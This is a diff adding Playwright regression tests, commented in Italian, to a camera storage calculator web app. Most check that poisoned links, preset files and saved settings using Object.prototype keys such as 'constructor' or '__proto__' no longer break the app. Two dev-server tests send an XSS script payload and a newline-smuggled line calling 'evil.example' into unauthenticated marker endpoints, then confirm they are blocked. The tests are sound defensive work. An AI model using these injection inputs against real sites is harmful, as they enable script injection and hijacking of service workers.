@@ -848,6 +848,128 @@ test.describe('Guida in inglese', () => {
   });
 });
 
+test.describe('Chiavi ereditate da Object.prototype', () => {
+  // Le tabelle di configurazione venivano interrogate con TABELLA[chiave] e
+  // usate come booleano. Membri ereditati come constructor, toString e valueOf
+  // sono truthy, quindi superavano ogni controllo: da un link condiviso si
+  // poteva mandare l'app in NaN, svuotarle il selettore delle camere o farle
+  // stampare a schermo il sorgente di una funzione nativa.
+  const CHIAVI = ['constructor', 'toString', 'valueOf', 'hasOwnProperty', '__proto__'];
+
+  test('non passano come scenario', async ({ page }) => {
+    for (const k of CHIAVI) {
+      await page.goto(`/index.html#b=dji&s=${k}`);
+      await page.reload();
+      const scen = await page.evaluate(() => selectedScenarios);
+      expect(scen, k).not.toContain(k);
+      // E niente sorgente di funzioni native finito nelle etichette.
+      await expect(page.locator('#res-pills'), k).not.toContainText('native code');
+    }
+  });
+
+  test('non passano come profilo bitrate', async ({ page }) => {
+    for (const k of CHIAVI) {
+      await page.goto(`/index.html#b=dji&s=reel&bp=${k}`);
+      await page.reload();
+      expect(await page.evaluate(() => currentBitrateProfile), k).toBe('high');
+      // Il bitrate finiva a NaN e con lui tutto il calcolo dello spazio.
+      await expect(page.locator('#metric-bitrate'), k).not.toContainText('NaN');
+    }
+  });
+
+  test('non passano come brand o modello', async ({ page }) => {
+    for (const k of CHIAVI) {
+      await page.goto(`/index.html#b=${k}&m=${k}&s=reel`);
+      await page.reload();
+      expect(await page.evaluate(() => currentBrand), k).toBe('dji');
+      // Col brand invalido il selettore delle camere restava vuoto.
+      await expect(page.locator('#model-chips-container .btn-chip'), k).not.toHaveCount(0);
+    }
+  });
+
+  test('un link avvelenato non produce errori in pagina', async ({ page }) => {
+    const errs = [];
+    page.on('pageerror', e => errs.push(e.message));
+    await page.goto('/index.html#b=constructor&m=constructor&s=constructor&bp=constructor');
+    await page.reload();
+    await page.waitForTimeout(400);
+    expect(errs).toEqual([]);
+  });
+
+  test('non passano da un file di preset importato', async ({ page }) => {
+    const errs = [];
+    page.on('pageerror', e => errs.push(e.message));
+    await page.setInputFiles('#input-import-presets', {
+      name: 'p.json', mimeType: 'application/json',
+      buffer: Buffer.from(JSON.stringify({ presets: [
+        { name: 'Trappola', scenarios: ['constructor'], brand: 'constructor',
+          modelKey: 'keys', bitrateProf: 'valueOf' }
+      ]}))
+    });
+    await page.locator('.preset-tag-btn', { hasText: 'Trappola' }).click();
+    await page.waitForTimeout(300);
+    const stato = await page.evaluate(() => ({
+      brand: currentBrand, bp: currentBitrateProfile, scen: selectedScenarios
+    }));
+    expect(stato.brand).toBe('dji');
+    expect(stato.bp).toBe('high');
+    expect(stato.scen).not.toContain('constructor');
+    expect(errs).toEqual([]);
+  });
+
+  test('non passano dalla camera predefinita salvata', async ({ page }) => {
+    // Questa e' la piu' insidiosa: sta in localStorage, quindi l'app restava
+    // rotta anche dopo il riavvio.
+    const errs = [];
+    page.on('pageerror', e => errs.push(e.message));
+    await page.evaluate(() => localStorage.setItem('camstudio_default_camera',
+      JSON.stringify({ brand: 'constructor', key: 'keys' })));
+    await page.reload();
+    await page.waitForTimeout(300);
+    expect(await page.evaluate(() => starredCamera)).toBeNull();
+    await expect(page.locator('#model-chips-container .btn-chip')).not.toHaveCount(0);
+    expect(errs).toEqual([]);
+  });
+});
+
+test.describe('Server di sviluppo', () => {
+  // serve.js non viene distribuito, ma gira sulla macchina di chi sviluppa e
+  // i suoi endpoint di prova non hanno autenticazione.
+  test('il marcatore di deploy non puo iniettare HTML', async ({ request, page }) => {
+    await request.get('/__test/marker?value=' + encodeURIComponent('"><script>window.__xss=1</script>'));
+    try {
+      await page.goto('/index.html');
+      await page.waitForTimeout(200);
+      expect(await page.evaluate(() => window.__xss)).toBeUndefined();
+      await expect(page.locator('meta[name="x-deploy-marker"]')).toHaveCount(0);
+    } finally {
+      await request.get('/__test/marker?value=');
+    }
+  });
+
+  test('il marcatore del worker non puo iniettare JavaScript', async ({ request }) => {
+    // Il worker e' il posto piu' privilegiato dell'origine: intercetta ogni
+    // richiesta e sopravvive alla chiusura della scheda.
+    await request.get('/__test/sw-bump?value=' + encodeURIComponent("X\nfetch('https://evil.example')"));
+    try {
+      const sw = await (await request.get('/sw.js')).text();
+      expect(sw).not.toContain('evil.example');
+      expect(sw).not.toContain('versione di prova');
+    } finally {
+      await request.get('/__test/sw-bump?value=');
+    }
+  });
+
+  test('un marcatore legittimo continua a funzionare', async ({ request }) => {
+    await request.get('/__test/sw-bump?value=NUOVA');
+    try {
+      expect(await (await request.get('/sw.js')).text()).toContain('versione di prova: NUOVA');
+    } finally {
+      await request.get('/__test/sw-bump?value=');
+    }
+  });
+});
+
 test.describe('Marchio', () => {
   test('e un segno vettoriale e non un emoji', async ({ page }) => {
     // Le emoji le disegna il sistema operativo: la stessa 🎥 cambia faccia
